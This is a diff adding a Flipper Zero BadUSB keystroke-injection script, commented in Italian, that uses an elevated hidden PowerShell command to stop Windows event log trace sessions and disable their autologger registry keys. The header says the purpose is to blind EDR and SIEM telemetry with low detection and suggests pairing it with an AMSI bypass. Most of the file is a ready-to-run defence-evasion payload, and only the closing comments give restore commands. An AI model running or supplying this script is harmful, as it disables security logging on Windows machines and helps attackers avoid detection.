@@ -1,0 +1,34 @@
+REM ============================================================
+REM Title:    ETW (Event Tracing for Windows) Blind
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Evasion
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~5 secondi
+REM Detect:   Basso - pochi EDR monitorano ETW patching
+REM Desc:     Disabilita Event Tracing for Windows per impedire
+REM           agli EDR di ricevere eventi telemetrici.
+REM           Combina con AMSI bypass per massima evasione.
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "$p=[System.Diagnostics.Eventing.EventProvider].GetField(''m_enabled'',''NonPublic,Instance'');$etwType=[System.Diagnostics.Eventing.EventProvider];foreach($proc in [System.Diagnostics.Process]::GetCurrentProcess().Modules){try{$assembly=[System.Reflection.Assembly]::LoadFrom($proc.FileName)}catch{continue}};[Reflection.Assembly]::LoadWithPartialName(''System.Core'')|Out-Null;logman stop EventLog-Application -ets 2>&1|Out-Null;logman stop EventLog-System -ets 2>&1|Out-Null;Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 0;Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System -Name Start -Value 0"'
+ENTER
+DELAY 2000
+ALT y
+
+REM ============================================================
+REM NOTA: Disabilitare ETW è una tecnica avanzata che:
+REM - Impedisce la raccolta di log da parte del SIEM
+REM - Acceca gli EDR che dipendono da ETW per telemetria
+REM - Va ripristinato dopo l'engagement
+REM
+REM Ripristino:
+REM Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 1
+REM Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System -Name Start -Value 1
+REM logman start EventLog-Application -ets
+REM logman start EventLog-System -ets
+REM ============================================================
